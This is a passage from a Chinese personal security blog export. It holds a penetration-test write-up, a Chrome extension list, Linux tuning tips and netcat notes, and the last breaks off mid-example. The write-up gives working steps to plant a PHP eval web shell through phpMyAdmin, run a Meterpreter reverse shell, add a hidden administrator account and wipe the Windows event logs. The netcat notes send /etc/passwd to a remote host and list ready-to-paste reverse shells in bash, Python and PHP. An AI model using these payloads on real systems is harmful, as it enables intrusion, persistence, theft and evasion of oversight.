没被关闭；由此判断管理员默认安装，这是很大的隐患。 如果管理员未对 phpmyadmin 目录下的 setup 文件进行安全处理，那普通用户可以在不进行身份认证的情况下，便可以配置服务器信息。 class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1g5zebt3js5j30y40jy74y.jpg\" 在这里呢！直接反手新建了一个服务器（MySQL服务器）。 class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1g5zecvdrknj31170l240f.jpg\" 而且在认证页面发现缓存的密码（huweishen.com），根据密码可以猜测 phpMyAdmin 安装方式应该是此护卫神网站上的某款软件傻瓜式安装滴！ 回到主页，未出意外地登录进去了。 CVE-2016-5734中间还有一个小插曲。找到一个 phpMyAdmin 需身份验证的远程代码执行漏洞。 CVE-2016-5734_POC $ ./cve-2016-5734.py -c &#39;system(ipconfig);&#39; -u root -p toor http://192.168.5.99:999/ ERROR: #1286 - Unknown storage engine &#39;InnoDB&#39; 但是很不幸，MySQL 中未开启 InnoDB 引擎。而开启方法只能是编辑系统中 MySQL 的配置文件 my.cnf。 MySQL [(none)]&gt; show variables like &quot;%innodb%&quot;; +-----------------------+----------+ | Variable_name | Value | +-----------------------+----------+ | have_innodb | DISABLED | | ignore_builtin_innodb | OFF | +-----------------------+----------+ 2 rows in set (0.002 sec) CVE-2016-5734 利用失败。。。 寻绝对路径，外写木马经测试发现，MySQL 中，into outfile 未被禁用，而且这里也不存在 WAF 拦截；root 用户拥有向外写文件的权限。 MySQL [(none)]&gt; SELECT @@global.secure_file_priv; +---------------------------+ | @@global.secure_file_priv | +---------------------------+ | | +---------------------------+ 1 row in set (0.001 sec) 再查询未使用 secure-file-priv 参数；这说明不仅能向外写文件，而且想往哪里写就往哪儿写。 所以，只需找到 Web 物理路径；使用 SQL 语句向 Web 目录写个一句话木马，就能拿到服务器的 shell。 首先先判断当前 MySQL 的数据、插件等目录： MySQL [(none)]&gt; show variables like &quot;%dir%&quot;; +-----------------------------------------+------------------------------------------+ | Variable_name | Value | +-----------------------------------------+------------------------------------------+ | basedir | D:/HwsApacheMaster/mysql/ | | binlog_direct_non_transactional_updates | OFF | | character_sets_dir | D:\\HwsApacheMaster\\mysql\\share\\charsets\\ | | datadir | D:\\HwsApacheMaster\\mysql\\Data\\ | | lc_messages_dir | D:\\HwsApacheMaster\\mysql\\share\\ | | plugin_dir | D:\\HwsApacheMaster\\mysql\\lib/plugin | | slave_load_tmpdir | C:\\Users\\MYSQL_~1.005\\AppData\\Local\\Temp | | tmpdir | C:\\Users\\MYSQL_~1.005\\AppData\\Local\\Temp | +-----------------------------------------+------------------------------------------+ 8 rows in set (0.002 sec) 发现 D:\\ 下一个有趣的目录 HwsApacheMaster，仅此而已。 此时把精力转向 Web 页面；打算在网页上瞎几掰乱试，指望 Web Application 程序出错，大力出奇迹般的报错将 Web 物理路径爆出来。绞尽脑汁地让程序报错；可惜，并没有。。。 思考许久……思路来了。 前面通过浏览器缓存发现的那个密码（huweishen.com）很有意思，通过这个密码可以发现，phpMyAdmin 是管理员默认安装的；灵光一现，直接去这个网站下载这个傻瓜式一键安装的软件（护卫神），安装至本地测试，不就知道了物理路径了嘛！！！ 这款软件叫做【护卫神·Apache大师】；安装一整套环境至本地，发现目录结构如下： ├── D:/ │ ├── HwsApacheMaster │ │ ├── phpmyadmin │ │ │ ├── web │ │ │ | ├── libraries │ │ │ | ├── database │ │ │ | ├── doc │ │ │ | ├── js │ │ │ | ├── setup │ │ │ | ├── themes │ │ ├── Apache2.2 │ │ ├── Tomcat8 │ │ ├── mysql │ │ ├── Java │ │ ├── php … … … … … 此时很明确了，直接一句话木马写至某目录；还有注意转义符。 MySQL [(none)]&gt; select &quot;&lt;?php @eval($_POST[&#39;a&#39;]); ?&gt;&quot; into outfile &#39;D:\\\\HwsApacheMaster\\\\phpMyAdmin\\\\web\\\\she11.php&#39;; Query OK, 1 row affected (0.002 sec) 然后，就可以使用菜刀等 shell 连接工具与木马进行连接；连接密码为 a 。 0x03 后渗透测试中国蚁剑由于菜刀只能在Windows上使用，而我操作系统为 Linux，使用的是另一款 shell 连接工具 AntSword(蚁剑) ， 开源、跨平台的网站（shell）管理工具。 class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1g5zedmj0sfj30o80hb0t9.jpg\" 连接上去后，进入终端，输入 cmd 命令会发现无法执行。 D:\\HwsApacheMaster\\phpmyadmin\\web&gt; whoami ret=127 这说明，php 配置文件 php.ini 中将一些危险函数给禁用掉了，即 disable_functions。将此项删除，清理一下缓存，便可以执行 cmd 了。 D:\\HwsApacheMaster\\phpmyadmin\\web&gt; whoami nt authority\\system 哇！system 权限。可是比 Administrator 管理员用户权限还要大，这也省的我之后的提权了。 连接 Metasploit由于菜刀、蚁剑这类工具功能相比于 MSF 功能比较欠缺，所以我要再次生成一个木马用来反弹 shell 连接 MSF。 $ msfvenom --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.5.23 LPORT=4444 -f exe -o she11.exe 参数： --platform 平台 -p payload，有效载荷 LHOST 本地IP LPORT 本地端口 -f 生成文件类型 -o 输出文件名 将生成的木马通过蚁剑传至服务器上一个有执行权限的目录；虽然我和服务器并不在一个网段（本以为要做内网穿透的），但防火墙为关闭状态，依旧能够建立连接。 首先，MSF 先在本地侦听着4444端口，等着 shell 反弹回来。 msf5 &gt; use exploit/multi/handler msf5 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp msf5 exploit(multi/handler) &gt; set LHOST 192.168.5.23 msf5 exploit(multi/handler) &gt; set LPORT 4444 msf5 exploit(multi/handler) &gt; exploit [*] Started reverse TCP handler on 192.168.5.23:4444 然后使用蚁剑，在 CMD 终端中执行刚刚生成的那个木马文件（she11.exe） C:\\Windows\\System32&gt; C:/Windows/System32/she11.exe 回车执行这个 exe 后，在 MSF 这边就会生成一个 meterpreter。 [*] Started reverse TCP handler on 192.168.5.23:4444 [*] Sending stage (206403 bytes) to 192.168.3.72 [*] Meterpreter session 1 opened (192.168.5.23:4444 -&gt; 192.168.3.72:55580) at 2019-08-14 17:59:57 +0800 meterpreter &gt; getuid 获取当前用户，还是 SYSTEM 。 meterpreter &gt; getuid Server username: NT AUTHORITY\\SYSTEM 开启远程 RDP 连接 meterpreter &gt; run post/windows/manage/enable_rdp [*] Enabling Remote Desktop [*] RDP is already enabled [*] Setting Terminal Services service startup mode [*] Terminal Services service is already set to auto [*] Opening port in local firewall if necessary [*] For cleanup execute Meterpreter resource file: /home/f4n9x/.msf4/loot/20190814180610_default_192.168.3.72_host.windows.cle_307378.txt 查看刚刚开启 RDP 执行的具体命令。 $ cat /home/f4n9x/.msf4/loot/20190814180610_default_192.168.3.72_host.windows.cle_307378.txt execute -H -f cmd.exe -a &quot;/c &#39;netsh firewall set service type = remotedesktop mode = enable&#39;&quot; 进入 CMD 模式。 meterpreter &gt; shell Process 7116 created. Channel 3 created. Microsoft Windows [版本 6.1.7600] 版权所有 (c) 2009 Microsoft Corporation。保留所有权利。 C:\\Windows\\System32&gt; 查看当前所有用户。 C:\\Windows\\System32&gt;net user \\\\ 的用户帐户 --------------------------------------------------------- Administrator Guest mysql MySQL_HWS www 创建一个隐藏用户（Windows中在用户名后带上**$**即为隐藏用户，仅是简单隐藏），并拉入管理员用户组，查看。 C:\\Windows\\System32&gt;net user she11$ D@i123 /add C:\\Windows\\System32&gt;net localgroup administrators she11$ /add C:\\Windows\\System32&gt;net user she11$ 用户名 she11$ 全名 注释 用户的注释 国家/地区代码 000 (系统默认值) 帐户启用 Yes 帐户到期 从不 上次设置密码 2019/8/14 0:30:02 密码到期 2019/9/25 0:30:02 密码可更改 2019/8/14 0:30:02 需要密码 Yes 用户可以更改密码 Yes 允许的工作站 All 登录脚本 用户配置文件 主目录 上次登录 2019/8/14 0:44:40 可允许的登录小时数 All 本地组成员 *Administrators *Users 全局组成员 *None 命令成功完成。 完成后，直接登录到服务器。 $ rdesktop 192.168.3.72 -u she11$ -p D@i123 -g 1024x960 class=\"lazyload\" data-src=\"http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1g5zedz4a7bj31hc0u0gt5.jpg\" 此过程中难免会留下日志信息痕迹，使用此命令来清理日志。 meterpreter &gt; clearev [*] Wiping 16000 records from Application... [*] Wiping 20128 records from System... [*] Wiping 18688 records from Security... 介于这台主机在一个单独的内网，后渗透的意义不大。所以就此完了。。。","categories":[],"tags":[{"name":"PenTest","slug":"PenTest","permalink":"https://fanqxu.github.io/tags/PenTest/"}],"author":"F4n9X"},{"title":"一些Chrome扩展推荐","slug":"My-Chrome-Extensions","date":"2019-07-10T12:57:14.000Z","updated":"2020-04-12T14:05:05.000Z","comments":true,"path":"2019/07/10/My-Chrome-Extensions/","link":"","permalink":"https://fanqxu.github.io/2019/07/10/My-Chrome-Extensions/","excerpt":"本人收集的一些不错的 Chrome 浏览器插件，目前也正在使用中。 由于精力有限，仅限 Google Chrome。 0x00 日常使用 | DailyProxy SwitchyOmega由于日常使用代理比较多（V2ray、Shadowsocksr、BurpSuite……），使用此插件来轻松快捷地管理和切换多个代理设置。","text":"本人收集的一些不错的 Chrome 浏览器插件，目前也正在使用中。 由于精力有限，仅限 Google Chrome。 0x00 日常使用 | DailyProxy SwitchyOmega由于日常使用代理比较多（V2ray、Shadowsocksr、BurpSuite……），使用此插件来轻松快捷地管理和切换多个代理设置。 VimiumVimium以Vim的精神提供键盘快捷键，用于导航和控制；由其命名，就应知道它与 Vim 的关系。确实能大大提高效率！！！ Bookmark Sidebar目前正在使用的一个浏览器书签管理器，给人的感觉就是小巧精美。 Chrome Cleaner Pro浏览器清理工具，加快 Chrome 响应速度。 Extension Manager插件太多，使用这款工具来分类一键管理所有插件，提高效率。 uBlock Origin一款高效的请求过滤工具：占用极低的内存和CPU，和其他常见的过滤工具相比，它能够加载并执行上千条过滤规则。 Remove Google Redirection避免谷歌搜索结果链接重定向，加快网址打开速度；同时防止点击追踪。 The Great Suspender冻结暂时用不到的标签页，以便释放系统资源。 GayHub由名字就可以看出来，这是一款 GitHub 辅助插件。 功能有： 文件目录树 TOC导航 夜间暗色主题 图片全屏预览 复制代码 图像展示 ………… Octotree又一款 GitHub 插件；个人感觉这个比上一个要好用。 Features： 易于导航的代码树，就像在IDE中一样 使用pjax快速浏览 支持私有存储库 Remu一直以来，我对于 GitHub 上 Stars 的所有仓库都难以恭候。原因在于 Stars 数量实在是太多、找起来太麻烦了。 直到这款插件的出现…… Remu 通过标签分类来对GitHub Stars进行高效管理，借助Gists强大能力实现跨平台的数据同步。 class=\"lazyload\" data-src=\"https://raw.githubusercontent.com/zenghongtu/Remu/master/docs/screenshot.png\" Feature： 显示 star 仓库 / watching 仓库 (默认关闭) 添加 Notes 仓库设置/编辑/删除标签 取消 Star / Download Zip / Clone with HTTPS Google 账号同步 Token/GistId, Gist 自动同步标签数据 ………… The Fucking Github这款工具和上面那个插件一样，用来很方便地查看、整理、搜索你已经 Star 过的项目和搜索 Github 上的项目。 在布局上，个人感觉比 Remu 要好看。 class=\"lazyload\" data-src=\"https://user-images.githubusercontent.com/22412818/56089456-8980d200-5ec5-11e9-9e6e-820677beefb8.png\" 0x01 文章写作 | Writeups新浪微博图床本博客大部分图片都是用的 新浪微博图床，正是使用的这款插件上传至新浪博客图床。 UploadCC一款简单的浏览器截屏插件。 Nimbus全屏幕捕获网页或任何部分；编辑的截图；录制截屏视频、修改屏幕截图、分享截图和截屏视频。 Notice：Nimbus ScreenShot - Quick Guide Fatkun Batch Download Image一款图片批量下载的插件，去试试这个站点 Octodex_octocat。 Emoji Keyboard这个扩展可让您在计算机上输入表情符号，我的一些博文中的表情包就是来自这里儿。 😜😏😎🤨🧐🤤😒 0x02 渗透测试 | PenTest 这一部分算重点！！！ 1）信息收集Wappalyzer识别网站所用技术栈，CMS、电商平台、开发语言、Web 框架、JS 框架、服务器软件、分析工具等等。 Shodan邪恶的 Shodan 官方推出的插件，会自动检查Shodan是否有当前网站的任何信息。该网站是否还运行FTP，DNS，SSH或一些不寻常的服务？使用此插件，您可以查看Shodan在给定网站/域上收集的所有信息。 IP Address and Domain Information强大的一款网络层面信息收集的插件；支持显示当前网站以下 IPv4/6 地址信息 ISP 信息 Domain 自身 IP 等等 的一些网络、主机、开放 TCP\\UDP 端口、服务软件、Whois、Geo、国家、DNS 等详细信息。 EXIF Viewer查看网站中图像的 EXIF 数据，如果它有。 Vulners Web Scanner基于 vulners.com 漏洞数据库的一款轻量级漏洞扫描程序。 Go Back in Time查看此页面过去的某段时间的页面缓存。 基于以下缓存镜像服务： CoralCDN Google Cache The Internet Archive Yahoo! Cache MSN Cache Gigablast Cache WebCite 2）HTTP MethodsLive HTTP Headers监控浏览器的所有HTTP/HTTPS流量；实时HTTP标头记录Chrome浏览器和Internet之间的所有HTTP流量。 HTTP Headers和上一款插件出自同一开发者，功能差不多。 HTTP Header Spy页面加载后立即检查请求 - 响应头和Cookie，无需额外的点击。 检查HTTP标头和响应时间，而无需打开页面检查器工具。 在您正在查看的页面中查看标题。 Request MakerRequest Maker是一种渗透测试工具。可以轻松捕获网页发出的请求，篡改URL，标题和POST数据，当然还可以发出新请求。Request Maker仅捕获通过HTML表单和XMLHttpRequests发送的请求。 Requestly修改HTTP请求（安装程序重定向，运行自定义Javascript，修改标题） 主要功能： 修改请求 URL User Scripts（类似 TamperMonkey） 修改 HTTP 请求和响应标头 修改 User Agent ………… 3）Developer ToolsFirebug Lite简单的开发者工具，控制台查看请求方式（GET、POST……） 支持控制台 HTML CSS Script DOM Web developerWeb Developer扩展将各种Web开发人员工具添加到浏览器中，支持 禁用各种脚本、插件等等 Cookie 管理 禁用各种 CSS 样式 ………… 4）好评工具d3coder编码\\解码 Chrome 插件，右击选中的文本进行各种类型的编码或者解码。 支持： Unix时间戳 rot13 base64 CRC32 / MD5 / SHA1散列 bin2hex bin2txt HTML实体 HTML specialchars URI编码 引用的印刷品 Escapeshellarg （PHP）反序列化 “L33T” - 说话 反向 HackBar好用不解释！！！ Features： GET、POST…… SQLi XSS LFI Encoding Hashing User-Agent Switcher and ManagerUser-Agent 切换管理器，支持自定义。 Notice： Spoofs and mimics browser’s User-Agent strings EditThisCookie这是一款 Cookie 管理器，支持增删改查、锁定、屏蔽 Cookie。 编辑cookies 删除cookies 添加一个新的cookie 创建cookies 搜索cookies 保护cookies (只读cookies) 拦截cookies (cookie 过滤器) 导出cookies为JSON, Netscape cookie 文档 (非常适合wget及curl), Perl::LPW 导入JSON格式cookies 限制任何cookie的最大有效期 改进性能，移除旧的cookies 导入cookies.txt 0x03 其他 | OthersTampermonkey 这款脚本管理器插件大部分人都比较清楚；油猴用于运行所谓的 userscripts。 Find Scripts： tampermonkey.net/scripts.php 墙推： Greasy Fork 很强大！！！ HTTPS Everywhere一款保护自身安全的浏览器插件；加密网络浏览，自动使用 HTTPS 连接访问站点，更加安全。 Privacy Badger此扩展插件自动保护用户隐私，免受用户浏览网页时无形加载的第三方跟踪器的侵害。开发者 EFF（电子前沿基金会）针对每个请求发送 Do Not Track。 ScriptSafe限制 JavaScript 脚本语言的权限，以保护用户。 最开始是在 Tor 浏览器中了解到这个插件的。 Notice：ScriptSafe Secure Shell ExtensionGoogle 官方推出的一款终端仿真器和SSH和SFTP客户端。 谷歌访问助手破解版已破解的谷歌访问助手，在我的其他代理工具失效时拿来临时使用。🤤","categories":[],"tags":[{"name":"Chrome","slug":"Chrome","permalink":"https://fanqxu.github.io/tags/Chrome/"}],"author":"F4n9X"},{"title":"Linux桌面性能瓶颈优化","slug":"linux-optimization","date":"2019-04-26T10:51:40.000Z","updated":"2021-05-02T14:47:23.364Z","comments":true,"path":"2019/04/26/linux-optimization/","link":"","permalink":"https://fanqxu.github.io/2019/04/26/linux-optimization/","excerpt":"将曾经使用 Ubuntu 的经验记录下来，并分享出去。 当然此文并不限于 Ubuntu。 0x00 SSD 硬盘分区对齐关于如今的固态硬盘，已不再需要手动分区对齐。因为目前主流 Linux 系统都已自动对齐文件系统和分区【页面大小4096字节】。 优化原则由于频繁写操作会磨损固态硬盘，所以对于其优化原则就是：【尽量减少写操作】。","text":"将曾经使用 Ubuntu 的经验记录下来，并分享出去。 当然此文并不限于 Ubuntu。 0x00 SSD 硬盘分区对齐关于如今的固态硬盘，已不再需要手动分区对齐。因为目前主流 Linux 系统都已自动对齐文件系统和分区【页面大小4096字节】。 优化原则由于频繁写操作会磨损固态硬盘，所以对于其优化原则就是：【尽量减少写操作】。 文件系统类型而对于文件系统类型，墙裂推荐【EXT4】，EXT4 文件系统的日志会对硬盘多产生一些写操作，但不会太多； 禁用写操作时间戳操作系统在对于文件读取时，同时还会对文件的时间戳进行一个写操作；而这个写操作的意义是很小的，所以关闭。 编辑分区表，为你的根分区和 Home 分区 都增加 noatime 选项。 $ sudo vim /etc/fstab 如下，由于我并没有将 Home 分区单独分出来，所有仅在 / 分区的 options 位置添加了 noatime。 # &lt;file system&gt; &lt;dir&gt; &lt;type&gt; &lt;options&gt; &lt;dump&gt; &lt;pass&gt; # /dev/sda1 UUID=4a7fcb3e-fdcc-4c03-9ee3-de3c5ds3da30 / ext4 noatime,rw,relatime 0 1 # /dev/sda2 UUID=F06E-6942 /boot/EFI vfat rw,relatime,fmask=0022,dmask=0022,codepage=437,iocharset=iso8859-1,shortname=mixed,utf8,errors=remount-ro 0 2 # /dev/sda3 UUID=c9e9e9d5-cde4-4ab4-adf9-027d56384e10 none swap defaults 0 0 禁用休眠计算机休眠挂起会导致磁盘进行大量的写操作，不过 Ubuntu 默认关闭。 碎片整理Linux 下不必要进行碎片整理，非但不必要，而且还得避免碎片整理。碎片整理会导致大量的写操作，对 SSD 是致命伤害。 TRIM 定期清理磁盘Ubuntu 默认已经安装 TRIM，可通过一下命令查看是否支持。 $ sudo hdparm -I /dev/sda | grep TRIM * Data Set Management TRIM supported (limit 8 blocks) * Deterministic read ZEROs after TRIM 查看服务状态： $ sudo systemctl status fstrim.service ● fstrim.service - Discard unused blocks on filesystems from /etc/fstab Loaded: loaded (/usr/lib/systemd/system/fstrim.service; static; vendor preset: disabled) Active: inactive (dead) Docs: man:fstrim(8) 此服务是关闭状态；因为默认一周清理一次，没必要时时对硬盘进行清理。 指定根分区节点，手动清理： $ sudo fstrim -v / 自定义每日清理： $ sudo mkdir -v /etc/systemd/system/fstrim.timer.d $ sudo vim /etc/systemd/system/fstrim.timer.d/override.conf 添加如下几行： [Timer] OnCalendar= OnCalendar=daily 硬盘缓存所谓缓存，其本质上就是一块内存空间；缓存机制会在 CPU 读取硬盘数据之前，提前将数据放入缓存之中；CPU 需要读取数据时，从而可以从缓存之中读取数据，进而从整体上提高系统的运行效率。此处缓存所指写缓存。 程序在运行中，会等待数据在写入到硬盘之后才会进行下一步操作。因为数据如果不写入至硬盘，还停留在内存中，一旦断电内存中的数据就会丢失。Ubuntu 默认没有开启写缓存；而对于有电源的笔记本，这是不必要的。所以建议笔记本 Linux 用户开启写缓存。PC 台式机谨慎！！！ 打开 【Disks】工具，先在左侧选择你的磁盘，然后点击右上角。找到【Drive Setting】开启【Enable Write Cache】 0x01 CPU安装微码介于 CPU 的完全，建议安装微码安全补丁。 Intel $ sudo apt install intel-microcode AMD $ sudo apt install amd64-microcode 温度监视安装一个温度监视器。 $ sudo apt install lm-sensors 查看： $ sensors coretemp-isa-0000 Adapter: ISA adapter Package id 0: +32.0°C (high = +100.0°C, crit = +100.0°C) Core 0: +30.0°C (high = +100.0°C, crit = +100.0°C) Core 1: +30.0°C (high = +100.0°C, crit = +100.0°C) acpitz-acpi-0 Adapter: ACPI interface temp1: +32.0°C (crit = +103.0°C) nouveau-pci-0100 Adapter: PCI adapter GPU core: +0.60 V (min = +0.60 V, max = +1.20 V) iwlwifi-virtual-0 Adapter: Virtual device temp1: +27.0°C pch_skylake-virtual-0 Adapter: Virtual device temp1: +27.5°C 0x02 内存优化限制 inode 缓存其实我也不太懂这是啥，便从维基上抄了下面这句话。 inode是指在许多“类Unix文件系统”中的一种数据结构。每个inode保存了文件系统中的一个文件系统对象（包括文件、目录、设备文件、socket、管道, 等等）的元信息数据，但不包括数据内容或者文件名[1]。 还是建议内存大一点的限制 inode 缓存，多大呢？大于4G吧。 某些系统项将在内存中保留更长的时间。可使计算机速度有明显的提升。 $ sudo vim /etc/sysctl.conf 添加如下配置至尾行： vm.vfs_cache_pressure=50 Tmp 放入内存Tmp 目录用于存放一些中间临时数据的目录，但是其位于硬盘，如果将其放入内存(Tmpfs)中，会大大提高一些数据读写的效率。还是建议内存大于8G的这么做。 $ sudo cp -v /usr/share/systemd/tmp.mount /etc/systemd/system/ $ sudo systemctl enable tmp.mount 重启生效，查看状态： $ systemctl status tmp.mount ● tmp.mount - /tmp Loaded: loaded (/etc/fstab; generated) Active: active (mounted) since Sat 2019-04-27 10:57:47 CST; 1h 20min ago Where: /tmp What: tmpfs Docs: man:fstab(5) man:systemd-fstab-generator(8) Tasks: 0 (limit: 4915) Memory: 32.0K CGroup: /system.slice/tmp.mount Apr 27 10:57:47 4rch systemd[1]: Mounting /tmp... Apr 27 10:57:47 4rch systemd[1]: Mounted /tmp. 如何取消呢？只需将此文件删除即可。 $ sudo rm -v /etc/systemd/system/tmp.mount 0x03 SWAP 分区由于内存的有限，所有当运行一个很大的程序时，系统会将一部分内存交换至 swap 交换分区中； swap 分区即为硬盘，与内存相比较，在速度上是有很大的差距的。 而且 Ubuntu 默认当还剩60%内存时就开始将一部分内存交换至 swap 分区中。 $ cat /proc/sys/vm/swappiness 60 修改 swappiness 参数。 $ sudo vim /etc/sysctl.conf 添加以下参数至以上配置文件的尾行。这个数值只是一个百分百，可以按照自己的需求自定义。 vm.swappiness=10 0x04 显示撕裂在正确安装 NVIDIA 显卡驱动之后，依旧有时候会出现窗口撕裂的现象。（AMD 貌似没有这回事） 这时就需要编辑 grub 配置文件来解决。 $ sudo vim /etc/default/grub 修改以下一行配置： GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet&quot; 在 quiet 后增加 nvidia-drm.modeset=1，如下。 GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet nvidia-drm.modeset=1&quot; 然后更新 grub，重启生效。 $ update-grub &amp;&amp; reboot 验证： $ xrandr --verbose | grep PRIME PRIME Synchronization:1 PRIME Synchronization:1 0x05 启动项优化Linux 下很多启动(开机自启)项默认都是隐藏状态；使用一条替换命令，显示所有启动项。 $ sudo sed -i &#39;s/NoDisplay=true/NoDisplay=false/g&#39; /etc/xdg/autostart/*.desktop 然后打开 Startup Applications，按照个人需求自定义关闭不需要的启动项。 0x06 浏览器优化限制 Firefox 写操作将 Firefox 网络缓存放入内存中，可提高运行速度； 首先打开 Firefox，在浏览器地址栏输入： about:config 回车，点击I accept the risk。 搜索 「browser.cache.disk.enable」，双击将 Value 由 true变为false。 再次搜索「browser.cache.memory.enable」，将 Value 变为true。 再然后右击，点击New，选择Integer，输入「browser.cache.memory.capacity」，点击 OK，输入值204800。 禁用 Firefox sessionstore由于恢复 Firefox 意外崩溃的回话会导致大量的写操作，这对于 SSD 硬盘是很受伤的，所以建议关闭。 搜索 「browser.sessionstore.interval」，将原来的值15000修改为15000000。 禁用无必要网络访问对于使用 Firefox 来进行 Web 应用程序截断代理、漏洞挖掘。使用过 BurpSuite 就会知道，可能经常会抓到一些其他无相关的站点的数据包， 这是 Firefox 在后台偷偷地去请求一个网址。 搜索「network.captive-portal-service.enabled」，双击将 Value 由 true变为false。 限制 Chrome 写操作Settings—-&gt;Advanced—-&gt;Privacy—-&gt;Use a prediction service to load pages more quickly 关闭此项。 0x07 系统清理清理系统不需要的缓存等等 $ sudo apt autoremove $ sudo apt autoclean 不得不承认这两条命令清理的并不彻底。 StacerGithub：github.com/oguzhaninan/Stacer 从仓库主页 releases 中找到以 .deb 结尾的软件包，下载并安装。这款软件是图形化操作，界面比较友好。 $ sudo dpkg -i stacer_1.0.9_amd64.deb Bleachbit这款软件貌似系统自带，搜索打开即可使用。其界面并没有 Stacer 那么友好，但清理的特别彻底。 关于系统清理，如果操作不当；轻则破坏你的个性化设置，严重可能会导致系统崩溃。请谨慎操作！！！ 0x08 优化电池寿命使用的是一种简单的办法。 安装一个软件包，并将电池优化的工作交给它。 $ sudo apt install tlp tlp-rdw 然后启动它： $ sudo tlp start TLP started in AC mode. 查看 tlp 状态： $ sudo tlp-stat ……","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://fanqxu.github.io/tags/linux/"}]},{"title":"瑞士军刀NETCAT使用笔记","slug":"NETCAT-使用笔记","date":"2019-04-20T11:32:55.000Z","updated":"2020-04-12T14:04:00.000Z","comments":true,"path":"2019/04/20/NETCAT-使用笔记/","link":"","permalink":"https://fanqxu.github.io/2019/04/20/NETCAT-%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/","excerpt":"Feature 网络工具中的瑞士军刀 侦听模式、传输模式 Telnet、获取Banner信息 传输即时文本信息、文件、目录 加密传输文件 远程控制、木马 加密所有流量 远程克隆硬盘 流媒体服务器","text":"Feature 网络工具中的瑞士军刀 侦听模式、传输模式 Telnet、获取Banner信息 传输即时文本信息、文件、目录 加密传输文件 远程控制、木马 加密所有流量 远程克隆硬盘 流媒体服务器 远程连接$ nc -nv 192.168.43.218 80 -n 后面跟IP地址，且不做域名解析 -v 显示详细信息内容 信息传输文本传输 服务端： $ nc -l -p 4444 -l 打开、侦听一个端口 -p 端口 客户端： $ nc -nv 192.168.43.218 4444 Connection to 192.168.43.218 4444 port [tcp/*] succeeded! 电子取证电子取证的原则就是尽量减少在被审计端的操作。 审计端： $ nc -l -p 4444 &gt; ps.txt 被审计端： ```shell$ ps aux | nc -nv 192.168.43.8 4444 -q 1 q 后面跟秒数，代表传输完成后多少秒断开连接 将进程信息由被审计端传到审计端。 文件传输 接受端 $ nc -lp 4444 &gt; passwd.txt 发送端 $ nc -nv 192.168.43.8 &lt; /etc/passwd -q 1 或者： 接收端 $ nc -q 1 -lp 4444 &gt; passwd.txt 发送端 $ nc -nv 192.168.43.8 4444 &lt; /etc/passwd 目录传输其实就是调用系统其他程序来完成功能的实现，包括下面的加密传输…… 发送端 $ tar -cvf - /var/www/html/dvwa/ | nc -lp 4444 -q 1 接受端 $ nc 192.168.43.218 4444 | tar -xvf - 加密传输 接受端 $ nc -lp 4444 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb &gt; passwd.txt 发送端 $ mcrypt --flush -Fbq -a rijndael-256 -m ecb &lt; /etc/passwd | nc -nv 192.168.43.8 4444 -q 1 Enter the passphrase (maximum of 512 characters) Connection to 192.168.43.8 4444 port [tcp/*] succeeded! Please use a combination of upper and lower case letters and numbers. Enter passphrase: 000000 Enter passphrase: 000000 流媒体服务 服务端 $ cat vlc.mp4 | nc -lp 4444 客户端 $ nc -nv 192.168.43.218 4444 | mplayer -vo x11 -cache 3000 - 端口扫描$ nc -nvz 192.168.43.218 1-1024 -z 端口扫描，无I/O输出模式 $ nc -vnzu 192.168.43.218 1-1024 -u 探测UDP流量，默认TCP 远程硬盘克隆调用系统命令 dd 来完成硬盘的克隆，从被取证端的 sda 磁盘克隆至取证端的 sda 磁盘。 取证端 $ nc -lp 4444 | dd of=/dev/sda 被取证端 $ dd if=/dev/sda | nc -nv 192.168.43.218 4444 -q 1 远程控制正向 被控制端 ubuntu 默认无 -e 参数；首先先修复nc，调出 -e 参数。 $ sudo rm /etc/alternatives/nc &amp;&amp; sudo ln -s /bin/nc.traditional /etc/alternatives/nc $ nc -lp 4444 -e /bin/bash 控制端 $ nc -nv 192.168.43.218 4444 反向 控制端 $ nc -lp 4444 被控制端 $ nc -nv 192.168.43.8 4444 -e /bin/bash Shell 反弹实际渗透测试中，目标主机 nc 或可能没有、不支持 -e 参数；这时就需要以下方式： 攻击者（192.168.1.108） $ nc -lvvp 4444 # 两个参数 v 代表显示更详细的信息。 目标主机 $ bash -i &gt;&amp; /dev/tcp/192.168.1.108/4444 0&gt;&amp;1 命令解释： bash -i 产生一个交互式shell。 &gt;&amp; 将联合符号(&amp;)前后内容相结合重定(&gt;)向至后者。 /dev/tcp/ip/port linux中所有内容(设备、网络等)都被抽象成一个文件的形式而存在，这里意思就是对socket网络连接的一个抽象。 0&gt;&amp;1 将标准输入和标准输出内容相结合，然后重定向至标准输出内容。 0 标准输入 1 标准输出 2 错误输出 整条命令的意思就是：bash 产生一个本地交互 shell 主动发起与攻击者(192.168.1.108)4444端口建立连接，重定向 TCP 4444连接到攻击者主机上；且将标准输入与标准输出相结合再次重定向给标准输出。即输入与攻击者输入命令，且接受命令输出！！！（表达能力有限） 或者： $ rm /tmp/reserve;mknod /tmp/reserve p;/bin/bash 0&lt;/tmp/reserve | nc 192.168.1.108 4444 1&gt;/tmp/reserve 命令解释： mknod 创建管道 p 创建一个FIFO，FIFO的意思即为先进先出(first-in,first-out) 简单理解：首先先创建一个（先进先出）管道reserve，然后将一个本机交互shell重定向给管道reserve，再然后将输出通过 nc 重定向到攻击者那端，并且将 shell 执行结果重定向至管道reserve。 其他……别管那么多、那么长，只管【复制粘贴】就行了 :) Pythonpython -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.108&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39; PHPphp -r &#39;$sock=fsockopen(&quot;192.168.1.108&quot;,8080);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39; JAVAr = Runtime.getRuntime() p = 